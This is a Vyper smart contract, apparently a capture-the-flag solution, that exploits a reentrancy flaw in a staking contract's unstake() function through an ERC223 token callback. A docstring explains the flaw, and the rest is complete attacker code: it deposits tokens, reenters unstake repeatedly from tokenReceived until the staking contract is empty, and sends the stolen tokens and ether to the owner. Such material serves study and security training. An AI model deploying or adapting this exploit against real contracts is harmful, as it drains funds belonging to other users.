# @version ^0.3.7

"""
The vulnerability is in the `unstake()` function of the 
Staking Contract. It does not follow the Check, Effects,
Interaction pattern. It first checks that the caller has 
enough balance to unstake amount, then it interacts with 
the calller by transfering the tokens to them, and then
finally it performs the updates to the state variables.
Since the underlying token is an ERC223 and implements a 
callback on contracts receiving the token, an attacker can 
reenter the Staking contract during the Interactions part 
of the `unstake()` function. They can keep on calling the 
`unstake()` function in their token callback function until
the contract is drained of all tokens.
"""

from vyper.interfaces import ERC20 as IERC20

interface IStaking:
    def token() -> address: view
    def unstake(amount: uint256): nonpayable 

owner: immutable(address)

staking: address
token: address
reenter: bool

@external
@payable
def __init__(_staking: address):
    owner = msg.sender
    self.staking = _staking
    self.token = IStaking(self.staking).token()

@external
def start_attack():
    assert msg.sender == owner, "!owner"
    IERC20(self.token).transfer(
        self.staking, 
        IERC20(self.token).balanceOf(self),
    )

@external
def finish_attack():
    assert msg.sender == owner, "!owner"
    IStaking(self.staking).unstake(IERC20(self.staking).balanceOf(self))
    IERC20(self.token).transfer(msg.sender, IERC20(self.token).balanceOf(self))
    send(msg.sender, self.balance)

@external
def tokenReceived(
    _from: address, 
    _amount: uint256, 
    _data: Bytes[max_value(uint8)],
):
    assert msg.sender == self.token, "!token"
    if self.reenter and IERC20(self.token).balanceOf(self.staking) > 0:
        IStaking(self.staking).unstake(_amount)
    else:
        self.reenter = True

@external
@payable
def __default__():
    pass
